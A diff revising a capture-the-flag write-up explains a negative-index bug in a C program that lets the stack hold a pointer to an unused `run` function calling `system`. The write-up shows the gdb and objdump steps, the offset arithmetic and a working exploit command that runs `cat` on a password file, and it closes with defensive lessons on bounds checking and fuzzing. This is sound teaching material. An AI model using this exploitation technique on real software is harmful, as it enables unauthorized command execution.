@@ -63,17 +63,16 @@ a negative index will reference a memory location before the beginning of `fns`,
 which happens to be on the stack.
 The stack is a memory region to store local variables,
 function parameters, return values, among others.
-The details depend on the CPU architecture,
-but roughly the following happens when `truncate_and_call` is called from `main`:
+Roughly the following happens when `truncate_and_call` is called from `main`:
 
 1. The function parameters are pushed on the stack in reverse order:
-   the string, the index, the array of functions
+   the string, the index, the array of functions.
 
-2. The pointer to the next line of code in `main` is pushed on the stack
+2. The pointer to the next instruction is pushed on the stack.
 
-3. The function `truncate_and_call` is called
+3. The function `truncate_and_call` is called.
 
-4. The local variable `buf` is pushed on the stack
+4. The local variable `buf` is pushed on the stack.
 
 When we reach the line of `fns[index](buf)`,
 the content of the stack looks something like this:
@@ -90,16 +89,16 @@ the content of the stack looks something like this:
 ```
 
 If index is 0-3,
-the program will find the address of `to_upper`, `to_lower`, and so on, respectively,
+the program will find the address of `to_upper`, `to_lower`, and so on,
 and execute it.
 Using a negative index,
-the program will do the same with whatever it finds at the pointed location.
+the program will do the same with whatever it finds at that location.
 
 Now,
-if the content of `buf` is stored before `fns`,
+if the content of `buf` is stored in the region before `fns`,
 we can put there the address of another function,
-and use an appropriate negative index to make the program execute it.
-This unused `run` function looks perfect for our purposes:
+and use the appropriate negative index to make the program execute it.
+The unused `run` function that was careless left inside the program looks perfect for our purposes:
 ```
 int run(const char *str) {
   // This function is now deprecated.
@@ -111,10 +110,10 @@ It takes a string and calls `system`,
 which in turn will run it in the shell.
 Since we can control the parameter,
 we can make the program run whatever we want.
-
 We can find the address of `run` using `objdump`:
 ```
-level02@box:/levels/level03$ objdump -d level03 | grep run
+level02@box:~$ /levels/level03/level03 -1 x
+level02@box:~$ objdump -d /levels/level03/level03 | grep run
 0804879b <run>:
 080487ae <truncate_and_call>:
  8048806:   74 05                   je     804880d <truncate_and_call+0x5f>
@@ -125,7 +124,7 @@ To find the right negative index,
 we need to figure out the distance between `fns` and `buf` in the memory.
 We can do that using `gdb`:
 ```
-level02@box:/levels/level03$ gdb ./level03
+level02@box:~$ gdb /levels/level03/level03
 (gdb) run -1 AAAAAAAA
 Starting program: /levels/level03/level03 -1 AAAAAAAA
 
@@ -135,7 +134,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 That is,
 we run the program with a negative index to make it crash,
-and `AAAAAAAA` as the string to make it easy to spot when we look at the memory content.
+and `AAAAAAAA` as the string to make it easy to spot when we inspect the memory content.
 When the program crashes,
 `gdb` outputs the address of the code it could not execute,
 in this example `0xb77e1334`.
@@ -158,17 +157,17 @@ now we know that `buf` starts at `0xbfae3d6c`.
 And since `fns[-1]` contains `0xb77e1334`,
 now we also know that `fns[0]` is at `0xbfae3dd8`.
 Before we can calculate the correct negative index,
-consider that we need to use `buf` for more than one thing:
+consider that we need to use `buf` for more than one purpose:
 
-1. It should contain the address of the `run` method somewhere in it.
+1. It should contain the address of the `run` method somewhere within.
 
-2. It should start with a suitable shell command to
-   reveal the content of the password file.
+2. It should start with shell command that
+   reveals the content of the password file.
 
 If, for example,
 we put the command `cat /home/level03/.password;` in the string,
 followed by the address of the `run` method,
-the memory will look something like this:
+the memory content will look something like this:
 ```
 0xbfae3d6c:   c a t       / h o m     e / l e     v e l 0
 0xbfae3d7c:   3 / . p     a s s w     o r d ;   0x0804879b
@@ -182,7 +181,7 @@ The difference between `fns` and the jump address is `0xbfae3dd8 - 0xbfae3d88 = 
 and since the size of an element in `fns` is 4 bytes,
 the index we're looking for is `-80 / 4 = -20`:
 ```
-level02@box:/levels/level03$ ./level03 -20 "cat /home/level03/.password;$(printf '\x9b\x87\x04\x08')"
+level02@box:~$ /levels/level03/level03 -20 "cat /home/level03/.password;$(printf '\x9b\x87\x04\x08')"
 eingaima
 cat: can't open '��': No such file or directory
 ```
@@ -191,12 +190,12 @@ cat: can't open '��': No such file or directory
 
 - When validating user input,
   remember to consider nonsense input too,
-  like negative indexes in this example,
-  also known as *fuzz testing*.
+  like negative indexes in this example.
+  This is also known as *fuzz testing*.
 
-- Always check array boundaries,
+- Always check array boundaries:
   make sure they are not breached at either end.
 
 - Remove unused, deprecated code,
-  especially if it's potentially dangerous.
+  especially if it may be dangerous.
 
